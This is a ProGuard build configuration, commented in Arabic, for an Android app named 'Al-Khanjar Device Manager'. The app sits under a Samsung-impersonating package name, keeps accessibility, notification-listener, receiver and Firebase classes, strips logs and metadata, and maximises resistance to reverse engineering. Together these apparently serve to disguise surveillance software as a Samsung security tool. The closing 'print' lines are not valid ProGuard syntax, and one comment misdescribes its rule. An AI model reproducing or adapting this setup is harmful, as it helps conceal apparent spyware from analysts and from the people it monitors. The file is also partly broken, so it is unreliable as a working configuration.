# ProGuard Rules - Al-Khanjar Device Manager
# تشويش كامل وحماية من الهندسة العكسية

# ========== القواعد الأساسية ==========

# الاحتفاظ بالأسماء الأساسية للنظام
-keepattributes *Annotation*
-keepattributes Signature
-keepattributes Exception

# تشويش كل شيء آخر
-repackageclasses 'x'
-allowaccessmodification
-optimizationpasses 5
-overloadaggressively

# ========== إخفاء الأسماء ==========

# تغيير أسماء الكلاسات
-classobfuscationdictionary obfuscation-dictionary.txt
# تغيير أسماء الحقول
-obfuscationdictionary obfuscation-dictionary.txt
# تغيير أسماء الدوال
-packageobfuscationdictionary obfuscation-dictionary.txt

# ========== Firebase ==========

-keep class com.google.firebase.** { *; }
-keep class com.google.android.gms.** { *; }
-dontwarn com.google.firebase.**
-dontwarn com.google.android.gms.**

# ========== الحفاظ على التطبيق ==========

-keep class com.samsung.android.security.v8.AlKhanjarApp { *; }
-keep class com.samsung.android.security.v8.MainActivity { *; }

# الحفاظ على الخدمات (ضروري للنظام)
-keep class * extends android.app.Service {
    public <init>(...);
}

-keep class * extends android.accessibilityservice.AccessibilityService {
    public <init>(...);
}

-keep class * extends android.service.notification.NotificationListenerService {
    public <init>(...);
}

# الحفاظ على المستقبلات
-keep class * extends android.content.BroadcastReceiver {
    public <init>(...);
}

# ========== إخفاء النصوص الحساسة ==========

# تشفير جميع النصوص في الكود
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}

# حذف كل رسائل التسجيل
-assumenosideeffects class java.io.PrintStream {
    public void println(%);
    public void println(**);
}

# ========== إزالة التعليقات والبيانات ==========

-keepattributes !SourceFile,!SourceDir
-renamesourcefileattribute ""

# ========== الحماية من التحليل ==========

# منع فك التعليمات البرمجية
-optimizations !code/simplification/arithmetic,!code/simplification/cast,!field/*,!class/merging/*

# إزالة الكود غير المستخدم
-dontwarn **
-ignorewarnings

# ========== Native Libraries ==========

-keepclasseswithmembernames class * {
    native <methods>;
}

# ========== Serialization ==========

-keepnames class * implements java.io.Serializable
-keepclassmembers class * implements java.io.Serializable {
    static final long serialVersionUID;
    private static final java.io.ObjectStreamField[] serialPersistentFields;
    !static !transient <fields>;
    private void writeObject(java.io.ObjectOutputStream);
    private void readObject(java.io.ObjectInputStream);
    java.lang.Object writeReplace();
    java.lang.Object readResolve();
}

# ========== Enums ==========

-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

# ========== Parcelable ==========

-keep class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator *;
}

# ========== إزالة التحذيرات ==========

-dontwarn javax.annotation.**
-dontwarn javax.inject.**
-dontwarn sun.misc.Unsafe
-dontwarn com.google.common.**
-dontwarn org.w3c.dom.bootstrap.**

# ========== الحماية القصوى ==========

# تشفير أسماء الملفات
-adaptresourcefilenames **.properties,**.xml,**.json
-adaptresourcefilecontents **.properties,**.xml,**.json

# إزالة البيانات الوصفية
-keepattributes !LocalVariableTable,!LocalVariableTypeTable

# منع استخراج الموارد
-keepresourcexmlelements manifest/application/meta-data@value

print "=========================================="
print "ProGuard Obfuscation Completed Successfully"
print "All code has been heavily obfuscated"
print "Reverse engineering protection: MAXIMUM"
print "=========================================="
